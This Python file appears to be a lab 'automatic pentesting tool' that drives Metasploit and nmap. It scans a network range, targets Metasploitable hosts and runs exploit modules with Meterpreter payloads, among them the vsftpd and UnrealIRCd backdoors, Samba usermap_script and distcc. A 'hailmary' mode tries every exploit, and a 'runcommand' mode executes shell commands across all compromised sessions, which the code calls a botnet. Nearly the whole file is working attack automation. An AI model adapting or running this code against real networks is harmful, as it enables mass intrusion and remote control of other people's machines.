from sys import argv
from typing import Protocol
from pymetasploit3.msfrpc import *
import nmap
import time
import random
import json

# Initialisation - connect to MSF RPC server
def init(uPassword="mypassword", uPort=55552):
    try:
        print('Connecting to client...')
        client = MsfRpcClient(uPassword, port=uPort)
        print('Connection successful')
        return client
    except:
        print(f'Error connecting to client: ensure that RPC client is running on port {uPort} and password is correct\n')
        exit(1)

# Initial scan and classification of network range
def scan(client, range='10.0.2.0/24'): 
    try:
        # Scan local network range using nmap
        print('Beginning scan of network...')
        nm = nmap.PortScanner()
        nm.scan(hosts=range)
        data = nm.get_nmap_last_output()
        
        # Import scan into Metasploit database
        workspace = Workspace(client, 'default')
        workspace.importdata(data)
        hosts = workspace.hosts.records('hosts')
        services = workspace.services.records('services')
        
        # Identify Metasploitable instances
        targets = []
        for service in services:
            if "Metasploitable" in service["info"]:
                targets += [service["host"]]
        print(f'Scan complete: {len(hosts)} hosts found on network, {len(targets)} are targets\n')
        return targets
    except Exception as e:
        print(f"EXCEPTION: {e}")
        print('Error scanning network, program terminating')
        exit(1)

# Loop through targets, attempting to exploit each with given list of exploits
def attemptExploit(client, target, exploits, timeout, debug):
    try:
        count = 0
        pwned = len(client.sessions.list)
        startTime = time.time()
        # Loop through all exploits using Meterpreter payloads
        for e in exploits:
            exploit = client.modules.use('exploit', e)
            try:
                for p in exploit.targetpayloads():
                    if 'meterpreter' in p:
                        # Set host option to be target hostname
                        try:
                            exploit['RHOST'] = target
                        except KeyError:
                            try:
                                exploit['RHOSTS'] = target
                            except KeyError:
                                continue
                        # Begin running an exploit
                        count+=1
                        if debug:
                            print(f'Attempting attack {count} against {target} - exploit {e} with payload {p}')
                        job = exploit.execute(payload=p)
                        jobID = job['job_id']
                        startTime = time.time()
                        # Wait for job to succeed, fail, or timeout
                        while(str(jobID) in list(client.jobs.list.keys())):
                            if time.time() - startTime >= timeout:
                                client.jobs.stop(jobID)
                                break
                        # If attack has succeeded on target stop
                        if len(client.sessions.list) > pwned:
                            print(f'Attack succeeded on {target} after {count} attempts\n')
                            pwned = len(client.sessions.list)
                            raise StopIteration
            except ValueError:
                pass

    except StopIteration:
        pass

# Attempt to exploit all targets
def exploitAll(client, targets, topExploits, timeout, debug):
    for targ in targets:
        #random.shuffle(topExploits)
        attemptExploit(client, targ, topExploits, timeout, debug)
    checkSessions(client)

# Print debug information about open sessions
def checkSessionsDebug(client: MsfRpcClient):
    print(f'Sessions:\n{json.dumps(client.sessions.list, indent=4)}\n\n')

# Print information about open sessions
def checkSessions(client: MsfRpcClient):
    sessionList = list(client.sessions.list.keys())
    if len(sessionList) < 1:
        print('----------------------------------------')
        print('There are no open sessions')
        print('----------------------------------------\n')
    else:
        print('----------------------------------------')
        print('Current sessions:')
        print('----------------------------------------')
        for c in sessionList:
            session = client.sessions.list[c]
            print(f"Session {c}: {session['desc']} on {session['session_host']}:{session['session_port']} with {session['platform']} platform")
        print('----------------------------------------\n')

# Create shells for all open sessions
def openShells(client: MsfRpcClient):
    shells = []
    sessionList = list(client.sessions.list.keys())
    if len(sessionList) < 1:
        return shells
    else:
        for key in sessionList:
            try:
                shell=client.sessions.session(key)
                shells+=[shell]
            except:
                # Skip this session
                pass
        return shells

# Run a command against the botnet (all open sessions)
def runCommand(client: MsfRpcClient, shells, command="help"):
    sessionList = list(client.sessions.list.keys())
    if len(sessionList) < 1:
        print('----------------------------------------')
        print('There are no open sessions')
        print('----------------------------------------\n')
    else:
        print('----------------------------------------')
        print(f"Running command '{command}' against {len(sessionList)} bots")
        print('----------------------------------------\n')
        for i, shell in enumerate(shells):
            try:
                print('----------------------------------------')
                print(f'Session {sessionList[i]}:')
                print(shell.run_with_output(command))
            except:
                print('----------------------------------------')
                print(f"Encountered error with session {sessionList[i]}, skipping...")
        print('----------------------------------------')
        print(f"Command execution finished")
        print('----------------------------------------\n')

# Print information about targets (Metasploitable machines on network)
def checkTargets(targets):
    count = 0
    print('----------------------------------------')
    print('Current targets:')
    print('----------------------------------------')
    for t in targets:
        count+=1
        print(f'{count}: {t}')
    print('----------------------------------------\n')

# Print information about user commands
def helpCommand():
    print('++++++++++++++++++++++++++++++++++++++++')
    print('Welcome to the automatic pentesting tool!')
    print('Created by Georgia Strongman')
    print('++++++++++++++++++++++++++++++++++++++++\n')
    print("To quit the program:")
    print("    exit")
    print("    quit\n")
    print("To list the open sessions and information about them:")
    print("    sessions\n")
    print("To list all information about open sessions:")
    print("    sessionsVerbose\n")
    print("To list the detected targets (Metasploitable machines):")
    print("    targets\n")
    print("To scan for an IP or range of IPs and detect targets (scan will be added to MSF db):")
    print("    scan=IP")
    print("        IP may be a single address: 10.0.2.4")
    print("        IP may be a range of addresses: 10.0.2.0/24")
    print("        Leave IP blank to re-scan the default: 10.0.2.0/24\n")
    print("To toggle verbose mode (prints more information when attacking):")
    print("    verbose=Value")
    print("        Value must be true or false\n")
    print("To change the attack timeout length (time in seconds where an exploit should time out):")
    print("    timeout=Value")
    print("        Value must be an integer\n")
    print("To attack the targets (using a list of exploits likely to succeed):")
    print("    attack\n")
    print("To attack the targets (using every single exploit within MSF):")
    print("    hailmary\n")
    print("To run a command against the botnet (all open sessions):")
    print("    runcommand=Command")
    print("        Command may contain spaces")
    print("        Leave command blank to run help command")
    print('++++++++++++++++++++++++++++++++++++++++\n')

# Main loop of program
def main():
    # Variables for exploitation loop
    timeout = 30
    verbose=False
    topExploits = ['unix/ftp/vsftpd_234_backdoor','multi/samba/usermap_script','multi/misc/java_rmi_server','linux/postgres/postgres_payload','unix/irc/unreal_ircd_3281_backdoor','unix/misc/distcc_exec']
    client = ""

    # Connect to RPC and scan network for Metasploitable
    if len(argv) > 3:
        print('Too many arguments: please provide password and port, or nothing to use defaults')
        print('Format: main.py mypassword 55552')
        exit(1)
    elif len(argv) == 3:
        try:
            uPort = int(argv[2])
            uPass = argv[1]
            print(f'Using password {uPass} and port {uPort}')
            client = init(uPass, uPort)
        except ValueError:
            print('Invalid argument: port must be an integer')
            exit(1)
        except:
            exit(1)                
    elif len(argv) == 2:
        print('Too few arguments: please provide password and port, or nothing to use defaults')
        print('Format: main.py mypassword 55552')
        exit(1)
    else:
        client = init()

    # Scan network, fetch open sessions, and create shells on these    
    targets = scan(client)
    checkSessions(client)
    shells = openShells(client)

    # User interaction loop
    print('What would you like to do?\n')
    while(True):
        command = input()
        # Quit program
        if command == "exit" or command == "quit":
            print('Exiting program, goodbye!')
            exit(0)
        # Print help info
        elif command == "help":
            helpCommand()
        # Print session info
        elif command == "sessions":
            checkSessions(client)
        # Print verbose session info
        elif command == "sessionsVerbose":
            checkSessionsDebug(client)
        # Print target info
        elif command == "targets":
            checkTargets(targets)
        # Scan network for specific IP or range, upload info to database
        elif "scan" in command:
            try:
                params = command.split("=")[1]
                targets = scan(client, params)
            except:
                print("Command error: format is 'scan=IP', IP can be single or a range using CIDR notation\n")
        # Toggle verbose mode for attacking
        elif "verbose" in command:
            try:
                params = command.split("=")[1].upper()
                if params == "TRUE":
                    verbose = True
                    print('Verbose mode has been enabled\n')
                elif params == "FALSE":
                    verbose = False
                    print('Verbose mode has been disabled\n')
                else:
                    print('Command error: invalid value given, setting verbose mode to false\n')
                    verbose = False
            except:
                print("Command error: format is 'verbose=True' or 'verbose=False'\n")
        # Change timeout length for attacking
        elif "timeout" in command:
            try:
                params = int(command.split("=")[1])
                timeout = params
                print(f"Now using timeout value of {timeout}\n")
            except:
                print("Command error: format is 'timeout=value', value must be an integer\n")
        # Run list of excellent exploits against targets, open shells on any victims
        elif command == "attack":
            print('----------------------------------------')
            print(f'Running top exploits aganst {len(targets)} targets (timeout: {timeout})')
            print('----------------------------------------')
            exploitAll(client, targets, topExploits, timeout, verbose)
            shells = openShells(client)
        # Run every single exploit against targets, open shells on any victims
        elif command == "hailmary":
            print('----------------------------------------')
            print(f'Running every single exploit aganst {len(targets)} targets (timeout: {timeout})')
            print('----------------------------------------')
            exploitAll(client, targets, client.modules.exploits, timeout, verbose)
            shells = openShells(client)
        # Run a command against all victims (botnet)
        elif "runcommand" in command:
            try:
                if len(list(client.sessions.list.keys())) < 1:
                    print("There are no open sessions, try running 'attack'\n")
                else:
                    cmd = command.split("=")[1]
                    if len(cmd) < 1:
                        runCommand(client, shells)
                    else:
                        runCommand(client, shells, cmd)
            except:
                print("Command error: format is 'runcommand=command', command may have spaces\n")

        else:
            print('Command not recognised: try help to see list of commands\n')

if __name__ == "__main__":
    main()